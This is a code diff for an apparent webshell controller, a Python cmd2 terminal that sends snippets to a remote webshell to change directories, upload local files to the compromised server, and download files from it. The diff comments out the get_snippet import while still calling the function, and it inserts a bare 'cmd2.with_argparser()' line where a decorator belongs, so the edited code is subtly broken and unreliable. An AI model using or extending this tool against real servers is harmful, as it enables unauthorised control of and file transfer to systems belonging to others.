@@ -10,7 +10,7 @@ import pathlib
 import base64
 
 from webshell_master_cmd import WebshellCmd
-from snippets.snippet_handler import get_snippet
+# from snippets.snippet_handler import get_snippet
 from communication import send_snippet
 
 
@@ -41,9 +41,10 @@ class ShellTerminal(WebshellCmd):
         """
         snippet = get_snippet("directory_change.snippet",
                               {"OLD_DIRECTORY": self.cwd, "DIRECTORY_CHANGE": statement.args})
-        self.cwd = send_snippet(snippet)
+        self.cwd = send_snippet(snippet)[0]
         self.prompt = self.cwd + "> "
-
+    
+    cmd2.with_argparser()
     def do_upload(self, statement: cmd2.Statement):
         """
         upload a local file to the remote webshell webserver, usage: upload local_file remote_path
@@ -52,7 +53,7 @@ class ShellTerminal(WebshellCmd):
         print(statement.arg_list)
         upload_parser = argparse.ArgumentParser(prog="File upload",
                                                 description="process upload information to server")
-        upload_parser.add_argument('local', help="Path to the file on the local machine")
+        upload_parser.add_argument('local', help="Path to the  file on the local machine")
         upload_parser.add_argument('remote', help="Path to the file on the remote machine, default: local name",
                                    default=None)
         if len(statement.arg_list) == 1:
@@ -60,7 +61,8 @@ class ShellTerminal(WebshellCmd):
         parsed_args = vars(upload_parser.parse_args(statement.arg_list))
         local_file = pathlib.Path(parsed_args['local'])
         snippet = get_snippet("file_upload.snippet", {"CURRENT_DIRECTORY": self.cwd})
-        print(send_snippet(snippet, files={'uploaded_file': (parsed_args['remote'], local_file.read_bytes())}))
+        upload_result = send_snippet(snippet, files={'uploaded_file': (parsed_args['remote'], local_file.read_bytes())})
+        print(upload_result[0])
 
     def do_download(self, statement: cmd2.Statement):
         download_parser = argparse.ArgumentParser(prog="File download",
